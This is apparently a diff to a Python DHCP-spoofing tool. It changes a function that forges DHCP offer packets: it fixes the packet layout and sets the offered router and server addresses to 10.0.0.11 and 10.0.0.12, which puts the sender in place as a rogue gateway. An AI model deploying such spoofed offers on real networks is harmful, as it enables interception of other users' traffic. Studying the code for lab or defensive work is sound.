@@ -102,7 +102,7 @@ def getSpoofedDHCPOffer(data) -> bytes:
     dhcpFlags = data['dhcp']['flags']
 
     offer = struct.pack(
-        '!BBBBIHHIIII16s64s128sI',
+        '!BBBBIHHIIII 16s 64s 128s I',
         DHCP_OP_REPLY,  # operation
         DHCPOFFER,  # type
         6,  # hlen | only one MAC address
@@ -111,10 +111,10 @@ def getSpoofedDHCPOffer(data) -> bytes:
         0x0000,  # secs
         dhcpFlags,  # flags
         struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],    # ciaddr
-        struct.unpack('!I', socket.inet_aton('10.0.0.10'))[0],  # yiaddr
-        struct.unpack('!I', socket.inet_aton('10.0.0.11'))[0],  # siaddr
+        struct.unpack('!I', socket.inet_aton('10.0.0.11'))[0],  # yiaddr
+        struct.unpack('!I', socket.inet_aton('10.0.0.12'))[0],  # siaddr
         struct.unpack('!I', socket.inet_aton('0.0.0.0'))[0],    # giaddr
-        client_mac,  # chaddr
+        client_mac+bytearray(getZeroList(10)),  # chaddr
         bytearray(getZeroList(64)),  # sname
         bytearray(getZeroList(128)),  # file
         0x63825363,
@@ -124,10 +124,10 @@ def getSpoofedDHCPOffer(data) -> bytes:
         '!BBB BB4s BB4s BB4s BBI BB4s B',
         53, 1, DHCPOFFER,  # message type
         1, 4, socket.inet_aton('255.255.255.0'),  # subnet mask opt
-        3, 4, socket.inet_aton('1.1.1.1'),  # router ip
-        6, 4, socket.inet_aton('8.8.8.8'),  # DNS server
+        3, 4, socket.inet_aton('10.0.0.11'),  # router ip
+        6, 4, socket.inet_aton('1.1.1.1'),  # DNS server
         51, 4, 3600,  # lease time (seconds)
-        54, 4, socket.inet_aton('10.0.0.11'),
+        54, 4, socket.inet_aton('10.0.0.12'),
         255,
     )
     print('offer opts', offer_opts)
